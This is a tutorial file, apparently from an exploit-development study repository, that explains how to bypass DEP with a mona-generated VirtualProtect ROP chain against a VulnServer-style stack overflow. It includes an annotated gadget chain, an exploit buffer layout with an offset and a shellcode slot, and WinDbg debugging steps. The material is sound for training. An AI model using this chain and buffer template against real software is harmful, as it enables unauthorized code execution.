# Annotated Walkthrough — DEP Bypass with ROP (VirtualProtect)

DEP is where most people stall. The goal of this file: **read a real mona VirtualProtect
chain and understand what every gadget does**, so when `mona rop` hands you a chain you can
debug it instead of praying. Pair with `00-methodology/dep-rop-playbook.md`.

Scenario: you already have a stack BOF with EIP control (say VulnServer-style, offset
2003), confirmed badchars `\x00`, but `mona mod` shows **NXCompat=True** → shellcode on the
stack won't execute.

---

## What we're building (the mental model)
A `ret` just pops the next stack value into EIP and continues. If the stack is a list of
gadget addresses (each ending in `ret`), execution hops gadget → gadget. We arrange those
hops to **call VirtualProtect** with the right arguments, which flips our shellcode's memory
page to executable, then "returns" into the shellcode.

```
VirtualProtect(
  lpAddress,      ; where our shellcode lives (usually ESP area)
  dwSize,         ; how many bytes to make executable (0x201 is plenty)
  flNewProtect,   ; 0x40 = PAGE_EXECUTE_READWRITE
  lpflOldProtect  ; a writable scratch address to receive the old protection
)
```
stdcall → args are pushed/placed right-to-left; after the call, execution returns to
whatever address sits where the "return address" of the call would be. mona arranges that
return to land on the shellcode.

## Step 1 — generate the chain
```
!py mona rop -m *.dll -cpb "\x00"
```
Outputs `rop_chains.txt` (ready-to-paste Python per API) and `rop.txt` (all gadgets).
Open `rop_chains.txt`, find the **VirtualProtect** block, read the header — mona tells you
if the chain is complete or missing a gadget (e.g. "[-] Unable to find gadget to put ... ").

## Step 2 — read what mona generated (annotated)
A typical mona VirtualProtect chain looks like this (addresses are examples). Each line is a
gadget address OR a value the previous `pop` consumes. Read the `#` comments — that's the
whole lesson:

```python
def create_rop_chain():
    rop_gadgets = [
      #[---] setup the register that will hold dwSize, flNewProtect etc. [---]
      0x10101010,  # POP EBP # RET         <- load EBP with...
      0x10101010,  # skipped / jmp esp target used as the "return into shellcode" later
      0x10202020,  # POP EBX # RET         <- EBX = dwSize
      0x00000201,  #   value -> EBX = 0x201 (size to mark executable)
      0x10303030,  # POP EDX # RET         <- EDX = flNewProtect
      0x00000040,  #   value -> EDX = 0x40 (PAGE_EXECUTE_READWRITE)
      0x10404040,  # POP ECX # RET         <- ECX = writable ptr (receives old protect)
      0x10500000,  #   value -> a &writable location (e.g. .data of a non-ASLR module)
      0x10505050,  # POP EDI # RET         <- EDI = a ROP NOP (ret) address
      0x10606060,  #   value -> address of a RETN (ROP NOP, for alignment)
      0x10707070,  # POP EAX # RET         <- EAX = address of VirtualProtect pointer (IAT)
      0x10808080,  #   value -> ptr to &VirtualProtect
      0x10909090,  # MOV EAX,[EAX] # RET   <- dereference: EAX now = VirtualProtect addr
      0x10a0a0a0,  # PUSHAD # RET          <- push all regs as the call frame, then ret
    ]
    return b"".join(struct.pack("<I", g) for g in rop_gadgets)
```

### Why PUSHAD is the clever bit
`PUSHAD` pushes EAX, ECX, EDX, EBX, original ESP, EBP, ESI, EDI — in that fixed order — onto
the stack. mona pre-loads those registers so that, right after `PUSHAD`, the stack reads as a
perfect VirtualProtect **call frame**:
```
[ EAX ] -> VirtualProtect address   (acts as the "function to run" via the ret)
[ ECX ] -> lpflOldProtect (writable)
[ EDX ] -> flNewProtect = 0x40
[ EBX ] -> dwSize = 0x201
[ ESP ] -> (placeholder)
[ EBP ] -> a "return address" that lands in your shellcode / a jmp esp
[ ESI ] -> ptr to VirtualProtect (or a ROP NOP)
[ EDI ] -> ROP NOP (ret)
```
The final `ret` of PUSHAD jumps into VirtualProtect; VirtualProtect's own `ret` lands on the
EBP slot → which mona set to code that reaches your shellcode (often a `jmp esp` or a
pointer to the NOPs right after the chain). Memory is now RWX → shellcode runs.

## Step 3 — place it in the exploit
```python
import struct
def p32(a): return struct.pack("<I", a)

offset = 2003
rop    = create_rop_chain()          # pasted from mona

# EIP must return INTO the chain. Simplest: the first chain entry sits right at the EIP
# slot, so the overwrite "is" the first gadget. i.e. buffer = A*offset + rop + ...
shellcode = b"\x90"*16 + b""         # msfvenom -b "\x00", lands after the chain
buf  = b"A"*offset + rop + shellcode + b"C"*(3000-offset-len(rop)-len(shellcode))
```
Key point: after the offset, the **first 4 bytes go into EIP** — so the first element of the
chain executes immediately, and the rest sit on the stack as the `ret` sled consumes them.
(If mona's chain assumes a `ret` at EIP first, prepend one; mona's header tells you.)

## Step 4 — debug it when it dies (this is the skill)
```
bp <first gadget address>      ; break at chain start
g                              ; trigger
t  t  t ...                    ; single-step gadget by gadget
```
Watch the registers fill: after each `POP reg; ret` the target register should hold the
value you expect (0x201 in EBX, 0x40 in EDX, etc.). Then:
```
bp kernel32!VirtualProtect     ; confirm the call actually happens
g
dd esp                         ; inspect the args: [ret][lpAddress][dwSize][0x40][lpOld]
```
If a register is wrong → a gadget got a badchar-substituted address, or came from a
rebased/ASLR module. If VirtualProtect is never hit → PUSHAD frame is misaligned (a value
is off by one slot). Fix, re-run.

## Common failure → cause
| Symptom | Cause | Fix |
|---|---|---|
| chain dies at gadget N | that address has a badchar | regen with `-cpb "\x00..."` |
| regs load but VP never called | PUSHAD frame misaligned | check each pre-load value/slot |
| works once, breaks on reboot | gadget from an ASLR module | `-cm aslr=false` or leak+RVA |
| VP called, still not executable | wrong lpAddress / dwSize=0 | point lpAddress at ESP region, size 0x201 |
| returns into garbage after VP | EBP "return" slot wrong | ensure it reaches your NOPs/jmp esp |

## Minimal mental checklist
1. `mona rop -cpb` → VirtualProtect chain.
2. Confirm chain is **complete** (mona header) and gadgets are **non-ASLR**.
3. Place: `A*offset + rop + NOPs + shellcode`.
4. Single-step once, fully, to *see* it work. Never trust a chain you haven't watched.

→ Playbook: `00-methodology/dep-rop-playbook.md` · Template: `02-templates/dep_rop.py`
